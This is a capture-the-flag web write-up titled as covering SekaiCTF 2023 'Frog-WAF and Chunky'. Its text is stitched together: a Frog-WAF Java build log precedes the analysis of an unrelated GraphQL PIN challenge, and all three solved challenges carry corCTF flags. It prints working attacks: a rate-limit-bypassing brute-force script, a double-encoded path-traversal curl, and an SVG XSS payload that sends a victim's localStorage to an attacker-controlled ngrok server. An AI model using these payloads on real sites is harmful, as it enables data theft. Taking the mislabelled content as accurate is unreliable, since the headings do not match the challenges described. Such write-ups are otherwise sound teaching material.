# SEKAI CTF 2023 - Web Writeups - Frog-WAF and Chunky

![](https://i.imgur.com/TTWINkD.png)

SekaiCTF is a Capture The Flag event hosted by [Team Project Sekai](https://sekai.team/), with some hardcore members of CTF Community.

Web challenges were fun. Worked in 3, solved 2.

## Challenge: Frog-WAF

### First-Look

![](https://i.imgur.com/bKCbPah.png)

In this challenge, you are presented with a Contact List. After adding, it shows the contacts on the top of the page.

![](https://i.imgur.com/5ZHJEUP.png)

Looks like some typical XSS challenge, but there is no bot involved, so it's something else.

We can use the source-code of the challenge to run locally.

```
$ ./build-docker.sh 
Sending build context to Docker daemon  949.2kB
Step 1/12 : FROM gradle:7.5-jdk11-alpine AS build
 ---> 90b77c8e5ac0
Step 2/12 : COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/

... BUNCH OF LINES

Successfully built a688b08fada6
Successfully tagged sekai_web_waffrog:latest
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/////////@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@////////*************@@@@@@@@@@@////////*************(@@@@@@@@
@@@@@@@@@@@@@@@/////*****************************/////********************@@@@@@
@@@@@@@@@@@@@////*///%%%(//////#%#/****************************////%%///*,%%@@@@
@@@@@@@@@@@@////%%////,,,,,,.....,,,%***********************///%//,,,,...,,,%@@@
@@@@@@@@@@@///#%///,,,,,,,,%&/,,,,.,,#********************///%//,,,,,,&&/ &&*%@@
@@@@@@@@@@///%%///,,,,&&&&&&%  &&&,,,,%******************///%//,,,,&&&&&&&&&&%@@
@@@@@@@@/////%///*,,&&&&&&&&&&&&&&&,,,%*****************///%//*,,,&&&&&&&&&&&%@@
@@@@@@@/////(%////,,,&&&&&&&&&&&&(,,,,%*****************///%///,,,,,,&&&&&,,%%@@
@@@@@@///////%%////,,,,,,,,,,,,,,,,,,%****************..*//%%///,,,,,,,,,,(%&@@@
@@@@//////////%%%////,,,,,,,,,,,,,,%/*****************,..*//%%/////,,,,/%%//@@@@
@@@//////////////%%%%/////////(%%#/********************...**//#%%%%%%%%//**/*@@@
@@/////*********///////////////**************************....***************//@@
@@/////*************************************(/********(((****,.*************//(@
@@/////**.(*******************************.(((********.((.****************//(,@@
@@/////*,.((/*****************************..*************,*************//((,..@@
@@@////***(*,,,((//*************************************************//((,,...@@@
@@@@////**,,,...,,,,(((////**************************,....****///(((,,,....%@@@@
@@@@@@///**,,,......,,,,,,,(((((/////////**********////////(((*,,,,.......@@@@@@
@@@@@@@///*,,,,...........,,,,,,,,,,,,,/((((((((((((,,,,,...,,...........@@@@@@@
@@@@@@@@@///,,,,....................,,,,,,,,,,,,,,,,,,.................@@@@@@@@@
@@@@@@@@@@@//,,,,,..................................................,@@@@@@@@@@@
@@@@@@@@@@@@@#/,,,,,..............................................,%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@/,,,,,,........................................,,@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%,,,,,,,.................................,,,(@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,.......................,,,,,%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
2023-09-03 15:41:10.974  INFO 1 --- [           main] com.sekai.app.Application                : Starting Application on 5ee0fb50de34 with PID 1 (/opt/frogwaf/frogwaf-0.0.1-SNAPSHOT.jar started by app in /)
... ANOTHER BUNCH OF LINES
2023-09-03 15:48:53.574  INFO 1 --- [nio-1337-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 18 ms
```

Now, the app is available on http://localhost:1337.

(Judging from the last CTFs I played, hackers are relly addicted to frogs).

### Code Analysis

It's a small NodeJS/Fastify app:

```javascript
import fastify from 'fastify'
import mercurius from 'mercurius'
import { randomInt } from 'crypto'
import { readFile } from 'fs/promises'

const app = fastify({
    logger: true
});
const index = await readFile('./index.html', 'utf-8');

const secret = randomInt(0, 10 ** 5); // 1 in a 100k??

console.log(secret);

let requests = 10;

setInterval(() => requests = 10, 60000);

await app.register(mercurius, {
    schema: `type Query {
        flag(pin: Int): String
    }`,
    resolvers: {
        Query: {
            flag: (_, { pin }) => {
                if (pin != secret) {
                    return 'Wrong!';
                }
                return process.env.FLAG || 'corctf{test}';
            }
        }
    },
    routes: false
});

app.get('/', (req, res) => {
    return res.header('Content-Type', 'text/html').send(index);
});

app.post('/', async (req, res) => {
    if (requests <= 0) {
        return res.send('no u')
    }
    requests --;
    return res.graphql(req.body);
});

app.listen({ host: '0.0.0.0', port: 80 });
```

#### Summary

* A `GET` to `/` returns the index.html static page with our textarea.
* A `POST` to `/` process the request body (AS IS) as GraphQL and returns the result.
    * There is a rate-limit of 10 requests/minute for the `POST`.
* The secret number is a random integer between 1 and 100k.
    * It uses the [crypto.randomInt](https://nodejs.org/api/crypto.html#cryptorandomintmin-max-callback).
* If you send a query guessing the correct number, it will send you the flag.

### Looking for Flaws

We have to hit the correct number between 1 and 100k. 

We don't have any information about it (like the previous random), so I wouldn't try to break it. Maybe you have more faith than me.

Brute-forcing must be the happy path here, since the range is not too big. But since we have a rate-limit of 10 requests/minute, it would take almost 7 days to break.
Not enough CTF time for that (and even with an impossible 1-week CTF, instances would stop in 10 minutes).

But we can use a trick here. Our rate-limit is based on the number of `POSTs` sent to the server, but GraphQL allows us to make more than 1 query in the same string. Since the app sends the whole body to the graphql engine, we can take advantage of it!

Let's make a test:

```graphql
query Abc { flag(pin: 1234) }
query Def { flag(pin: 1235) }
```

But it complains:

```json
{
    "errors": [
        {
            "message": "Must provide operation name if query contains multiple operations."
        }
    ],
    "data": null
}
```

That's where we took some time to solve it. We where trying to send mutiple queries using the JSON with `operationName` and the `query`, like this:

```json
{
    "query": "query Abc { flag(pin: 1) }",
    "operationName": "Flag1"
}
```

We got nowhere like these. While overcomplicating this, we found some interesting things that may or may not get us a future article.

Since we saw a lot of solves, we knew that there must be a simpler path and we were just missing the right syntax. [Alisson](https://twitter.com/InfektionCTF) came out to rescue with the simpler format I hadn't seen for this:

```graphql
query GetFlag {
    f1: flag(pin: 1)
    f2: flag(pin: 2)
}
```

And we finally got what we wanted: multiple queries and multiple answers in the same request, which bypass the rate-limit, allowing the brute-force.

```json
{
    "data": {
        "f1": "Wrong!",
        "f2": "Wrong!"
    }
}
```
### Exploiting

In a GraphQL perspective, we could, in theory, send only 1 request with all 100k queries, but the request get's too big.
We tested and decided for a 10k queries/request, which fit inside the rate-limit for solving in 1 minute or less, because it's a maximum of 10 requests.

This is a "beautified" version of the exploit we used in the CTF, for beautifying purposes.

```python
import requests

headers = {
    'Content-Type': 'text/plain;charset=UTF-8',
}

for i in range(10):
    MAX_NUM = 10000 # Max Request Size
    INI = (i*MAX_NUM)+MAX_NUM
    print(f'=========> Brute Range: {INI} - {INI+MAX_NUM-1}')
    QUERIES = '\n'.join([f'f{x}: flag(pin: {x})' for x in range(INI,INI+MAX_NUM)])
    OPERATION = 'query Getflag { ' + QUERIES +' }'

    response = requests.post('https://web-force-force-384c2b201a1a2244.be.ax/', headers=headers, data=OPERATION)

    result = response.text.replace(',', ',\n')
    print(f'Status: {response.status_code}')

    FLAG_PREFIX = 'corctf{'
    index = result.find(FLAG_PREFIX)
    if index > 0:
        flag_ini = index
        flag_end = result.index('}', index+len(FLAG_PREFIX)) + 1
        flag = result[index:flag_end]
        print(f'Flag is {flag}')
        break
    else:
        print('Not yet!')
    print()
```

![](https://i.imgur.com/iIOWDcC.jpg)

```
python exploit2.py 
=========> Brute Range: 10000 - 19999
Status: 200
Not yet!

=========> Brute Range: 20000 - 29999
Status: 200
Not yet!

=========> Brute Range: 30000 - 39999
Status: 200
Not yet!

=========> Brute Range: 40000 - 49999
Status: 200
Not yet!

=========> Brute Range: 50000 - 59999
Status: 200
Not yet!

=========> Brute Range: 60000 - 69999
Status: 200
Flag is corctf{S                T                  O               N                   K                 S}
```

![](https://i.imgur.com/EvORM3E.jpg)

```
corctf{S                T                  O               N                   K                 S}
```

## Challenge: msfrognymize

![](https://i.imgur.com/0MTx7ug.png)

### First-Look

This challenge gives you an upload page that "anonymizes" an image.

![](https://i.imgur.com/jr3XwH9.png)

After uploading an image:

![](https://i.imgur.com/meS6iU6.png)
(OK, now he's protected)

### Code Analysis

OK, I could make a complete analysis of the challenge, but after reading some code, we got to the visualization route:

```python
@app.route('/anonymized/<image_file>')
def serve_image(image_file):
    file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
    
    if ".." in file_path or not os.path.exists(file_path):
        return f"Image {file_path} cannot be found.", 404
    return send_file(file_path, mimetype='image/png')
```

Since it downloads a local file path given by the `image_file` parameter, we think of an LFI immediately.

There is a filter for `..`, to avoid a path traversal, like `../../../flag.txt`. We can't use the most basic LFI.

It turns out that `os.path.join` has an almost backdoor-like behaviour of ignoring the first parameter if the last is an absolute path. 

```python
>>> import os
>>> 
>>> os.path.join('/uploads', 'file1.png')
'/uploads/file1.png'
>>> 
>>> os.path.join('/uploads', '/file1.png')
'/file1.png'
```

Why? I don´t know. I have to read more about it on the spec documents.

![](https://i.imgur.com/zAJBKOn.jpg)

But knowing this, and also that the flag is in the file `/flag.txt`, we can just think of this.

```python
>>> os.path.join('/uploads', '/flag.txt')
'/flag.txt'
```

Also note that it calls an `unquote` in the `image_file` path parameter.

### Exploiting

Let's try calling it directly, just for fun.

```
curl --path-as-is https://msfrognymize.be.ax/anonymized//flag.txt
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://msfrognymize.be.ax/anonymized/flag.txt">http://msfrognymize.be.ax/anonymized/flag.txt</a>. If not, click the link.
```

It's fixing the path and and redirecting... not good. Let's try URL Encoded.

```javascript
> encodeURIComponent('/flag.txt')
'%2Fflag.txt'
>
```

Go again

```
curl --path-as-is https://msfrognymize.be.ax/anonymized/%2Fflag.txt
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://msfrognymize.be.ax/anonymized/flag.txt">http://msfrognymize.be.ax/anonymized/flag.txt</a>. If not, click the link.
```

Same boring result. Since it's unquoting on the server side (beyond basic HTTP transfer), let's double-quote it:

```javascript
> encodeURIComponent(encodeURIComponent('/flag.txt'))
'%252Fflag.txt'
```

![](https://i.imgur.com/f9gaQir.jpg)

```
curl --path-as-is https://msfrognymize.be.ax/anonymized/%252Fflag.txt

corctf{Fr0m_Priv4cy_t0_LFI}
```

## Challenge: FrogShare

![](https://i.imgur.com/LG1pxpB.png)

### First-Look

After registration, you a see 4 (frog) cards owned by `admin` and a plus sign, which is a button to add a new card owned by your user.

![](https://i.imgur.com/PhDm8oh.png)

On the new card screen, you have some simple options, including an SVG URL for your frog.

![](https://i.imgur.com/aCmucRx.png)

SVG URL...

![](https://i.imgur.com/MC9qzvd.jpg)

### Code Analysis

It's a Node/NextJS App. There is a lot of code in various files here, so I won't go into detail in all of them.

First of all, let's check where the flag will be available.

* **secret.js**

```javascript
export default {
    flag: "corctf{t3st_fl4g}",
    password: "adminadmin"
};
```

* **adminbot.js**

```javascript
import secrets from './secrets';

const username = "admin";
const { flag, password } = secrets;

export default {
    id: 'frogshare',
    name: 'frogshare',
    timeout: 20000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto("https://frogshare.be.ax/login", { waitUntil: 'load' });

        await page.evaluate((flag) => {
            localStorage.setItem("flag", flag);
        }, flag);

        await page.type("input[name=username]", username);
        await page.type("input[name=password]", password);
        await Promise.all([
            page.waitForNavigation(),
            page.click("input[type=submit]")
        ]);
        /* No idea why the f this is required :| */
        await page.goto("https://frogshare.be.ax/frogs?wtf=nextjs", { timeout: 5000, waitUntil: 'networkidle0' });
        await page.waitForTimeout(2000);
        await page.goto(url, { timeout: 5000, waitUntil: 'networkidle0' });
        await page.waitForTimeout(5000);
    },
}

```
#### Adminbot Summary

For those unfamiliar with XSS challenges, you usually have an admin bot, that simulates a real user with admin privileges, logs in in the same system you're trying to hack and navigate to some URL you provide.

- Imports the secrets (including the flag)
- Login with `admin` and the secret password (not the same of our provided source code, of course).
- Puts the flag in the admin browser localStorage.
- Navigate to main page: `https://frogshare.be.ax/frogs?wtf=nextjs`
- Navigate to the URL we provide.
- Wait 5 seconds on the page.

So, the objetive here is to leak the Flag from the Admin Browser localStorage.
The 5 seconds are basically the time our XSS has to leak the info.

### Looking for Flaws

At the begining of the challenge, an NPM package called my attention, which is being used in Frog.js: `external-svg-loader`.

https://github.com/shubhamjain/svg-loader

`SVG Loader is a simple JS library that fetches SVGs using XHR and injects the SVG code in the tag's place. This lets you use externally stored SVGs (e.g, on CDN) just like inline SVGs.`

There is something here. This library injects external SVGs (cross-domain) in the local (target) DOM. SVGs can contain JavaScript.
In the case of this app, since we provide the SVG, we can also inject it's JavaScript, in theory.

The documentation shows that there is a protection on it:

```
2. Enable Javascript
SVG format supports scripting. However, for security reasons, svg-loader will strip all JS code before injecting the SVG file. You can enable it by:
```

```html
<svg
  data-src="https://unpkg.com/@mdi/svg@5.9.55/svg/heart.svg"
  data-js="enabled"
  onclick="alert('clicked')"
  width="50"
  height="50"
  fill="red"></svg>
```

It only loads JavaScript when `data-js` attribute is `enable`, which is not there, by looking at the tag in Frog.js.

```html
<svg data-src={img} {...svgProps} />
```

BUT, `svgProps` comes from the frog object, which comes from the user payload:

```javascript
const svgProps = useMemo(() => {
        try {
            return JSON.parse(frog.svgProps);
        } catch {
            return null;
        }
    }, [frog.svgProps]);
```

It puts all the attributes sent by the user on the svg object.

Let's look at a sample JSON request for it, while submitting the frog info.

```json
{
    "name": "NepFrog",
    "url": "https://ctf.cor.team/2023-ctf/frogs/pepega-frog.svg",
    "svgProps": {
        "height": 100,
        "width": 100
    }
}
```

Let's see the happy-path result:

![](https://i.imgur.com/0hmQfcm.png)

```html
<svg 
  data-src="https://ctf.cor.team/2023-ctf/frogs/pepega-frog.svg" 
  height="100" 
  width="100" 
  version="1.1" 
  id="Layer_1" 
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  viewBox="0 0 512.003 512.003"
  xml:space="preserve" 
  data-id="svg-loader_44">
```
Note that our parameters `height` and `width` turned into HTML attributes for the svg object.

### Exploiting

Now we have information for an action plan:
* Inject `data-js` attribute on the svg tag (controlled by the `external-svg-loader`).
* Provide a URL of an SVG with an evil JavaScript to run in the admin context/session, in the same domain.

Let's try injecting the `data-js` parameter on the svg.

* **`payload.json`**

```json
{
    "name": "NepFrog",
    "url": "https://ctf.cor.team/2023-ctf/frogs/pepega-frog.svg",
    "svgProps": {
        "height": 100,
        "width": 100,
        "data-js": "enabled"
    }
}
```

* **`inject-payload.sh`**

```bash
curl 'https://frogshare.be.ax/api/frogs?id=81' \
  -X 'PATCH' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=2bbfe567ecf3c637ea12379ae3cc160a96e2fa84530c821b8e0f42e7cc7293ac' \
  -d @payload.json

{"msg":"Frog updated successfully"}
```

After reloading, our injected attribute is there.

```html
<svg 
    data-src="https://ctf.cor.team/2023-ctf/frogs/pepega-frog.svg" 
    height="100" width="100" 
    data-js="enabled"
    version="1.1" id="Layer_1"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink"
    viewBox="0 0 512.003 512.003"
    xml:space="preserve" 
    data-id="svg-loader_1">
```

We just bypassed the javascript filter.

We now need to serve the rogue SVG from our controlled-server. Since `external-svg-loader` relies or CORS for fetching, I created an app with my own hands for this.

![](https://i.imgur.com/tSe8pmU.png)

"I" came out with the source below:

```python
from flask import Flask, send_file, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Habilita CORS para a aplicação Flask

# Server the evil svg
@app.route('/svg')
def serve_svg():
    svg_file_path = 'evil.svg'
    return send_file(svg_file_path, mimetype='image/svg+xml')

# Route to receive the flag
@app.route('/flag')
def flag_route():
    data = request.args.get('data', '')
    return data

if __name__ == '__main__':
    app.run()
```

The last piece is the evil SVG itself, served through ngrok, which points to my running local webapp.

We can use a very simple JavaScript to get the localStorage info and send it back to our server. Logging to the console only to simplify local tests.

```javascript
console.log("Hello!");
fetch("https://ngrok-url/flag?data=" +
          encodeURIComponent(localStorage.getItem("flag")), 
    {"mode": "no-cors"})
    .then(() => console.log("Sent!"));
```

That goes in our SVG:

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        console.log("Hello!");
        fetch("https://0000-000-00-000-00.ngrok-free.app/flag?data=" + encodeURIComponent(localStorage.getItem("flag")), {"mode": "no-cors"}).then(() => console.log("Sent!"));
    //]]>
    </script>
</svg>
```

Let's test the payload in the App, with our user. For fun, let's put a fake flag in the localStorage of our browser in the frogshare app domain.

![](https://i.imgur.com/g4zPLi2.png)

Let's Frog it:

```json
{
    "name": "NepFrog",
    "url": "https://fd5f-201-17-122-29.ngrok-free.app/svg",
    "svgProps": {
        "height": 100,
        "width": 100,
        "data-js": "enabled"
    }
}
```

Looks like something is on its way

![](https://i.imgur.com/nATsIQf.png)

Ngrok validates our test

![](https://i.imgur.com/q14MEo3.png)

Hack is in place. Fire in the (AdminBot) Hole!

![](https://i.imgur.com/AfUBfek.png)

![](https://i.imgur.com/QFaCjAb.png)

`corctf{M1nd_Th3_Pr0p_spR34d1ng_XSS_ThR34t}`

![](https://i.imgur.com/dW4f0dN.png)

## References
* Team: [FireShell](https://fireshellsecurity.team/)
* [Team Twitter](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 
* [GraphQL](https://graphql.org/)
* [MercuriusJS](https://github.com/mercurius-js/mercurius)
* [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)
* [external-svg-loader](https://github.com/shubhamjain/svg-loader)
* [ngrok](https://ngrok.com/)
* [CTF Time Event](https://ctftime.org/event/1928)
* [Crusaders of Rust Team
](https://cor.team/)
* [Crusaders of Rust Twitter](https://twitter.com/cor_ctf)